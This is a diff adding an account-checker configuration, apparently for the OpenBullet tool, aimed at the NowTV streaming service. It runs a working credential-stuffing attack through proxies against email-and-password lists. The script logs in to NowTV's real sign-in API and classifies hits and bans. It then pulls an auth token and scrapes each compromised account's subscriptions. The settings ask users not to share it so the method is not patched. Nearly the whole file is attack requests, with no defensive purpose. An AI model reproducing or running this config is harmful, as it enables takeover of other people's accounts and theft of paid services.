@@ -1,0 +1,89 @@
+[SETTINGS]
+{
+  "Name": "Now TV",
+  "SuggestedBots": 5,
+  "LastModified": "2019-03-19T03:26:32.2306985+01:00",
+  "AdditionalInfo": "Do not share or people will rape the method and it gets patched",
+  "Author": "Fairy#6869",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST REQUEST POST "https://uiapi.id.nowtv.com/signin/service/international" AutoRedirect=TRUE 
+  CONTENT "userIdentifier=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-SkyOTT-Territory: gb" 
+  HEADER "X-SkyOTT-Provider: nowtv" 
+  HEADER "X-SkyOTT-Device: COMPUTER" 
+  HEADER "X-SkyOTT-Platform: PC" 
+  HEADER "X-SkyOTT-Proposition: nowtv" 
+  HEADER "Origin: https://www.nowtv.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "class\":[\"success" 
+  KEYCHAIN Failure OR 
+    KEY "class\":[\"signin" 
+    KEY "class\":[\"error" 
+  KEYCHAIN Ban OR 
+    KEY "Sky - Error" 
+#COOKIE PARSE "<COOKIES(skyCEsidismesso01)>" LR "" "" Recursive=FALSE -> VAR "COO" "" "" 
+#ENCRYPT FUNCTION Hash MD5 "{\"auth\":{\"authScheme\":\"SSO\",\"authToken\":\"<COO>\",\"authIssuer\":\"NOWTV\",\"provider\":\"NOWTV\",\"providerTerritory\":\"GB\",\"proposition\":\"NOWTV\"},\"device\":{\"type\":\"COMPUTER\",\"platform\":\"PC\"}}" -> VAR "HASH" 
+#POST_TOKEN REQUEST POST "https://auth.client.ott.sky.com/auth/tokens" AutoRedirect=TRUE 
+  CONTENT "{\"auth\":{\"authScheme\":\"SSO\",\"authToken\":\"<COO>\",\"authIssuer\":\"NOWTV\",\"provider\":\"NOWTV\",\"providerTerritory\":\"GB\",\"proposition\":\"NOWTV\"},\"device\":{\"type\":\"COMPUTER\",\"platform\":\"PC\"}}" 
+  CONTENTTYPE "application/vnd.tokens.v1+json" 
+  HEADER "Accept: application/vnd.tokens.v1+json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: auth.client.ott.sky.com" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.nowtv.com/gb/sign-in?" 
+  HEADER "x-skyott-agent: nowtv.computer.pc" 
+  HEADER "x-skyott-proposition: NOWTV" 
+  HEADER "x-skyott-provider: NOWTV" 
+  HEADER "x-skyott-territory: GB" 
+  HEADER "x-skyott-platform: PC" 
+  HEADER "x-skyott-device: COMPUTER" 
+  HEADER "Content-MD5: <HASH>" 
+  HEADER "Origin: https://www.nowtv.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+#AUTH_TOKEN PARSE "<SOURCE>" JSON "userToken" Recursive=FALSE -> VAR "TOK" "" "" 
+#GET_CAP REQUEST GET "https://services.nowtv.com/account/summary?paymentInfo=true&kidsAware=true&partners=hayu&partners=sportsmobile" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: services.nowtv.com" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://account.nowtv.com/passes" 
+  HEADER "Authorization: NowTV-Auth <TOK>" 
+  HEADER "X-NowTV-ClientID: ark password 2.0" 
+  HEADER "Origin: https://account.nowtv.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "product/" 
+#PRODUCTS PARSE "<SOURCE>" LR "product/" "/" Recursive=TRUE -> CAP "Subscriptions" "" "" 
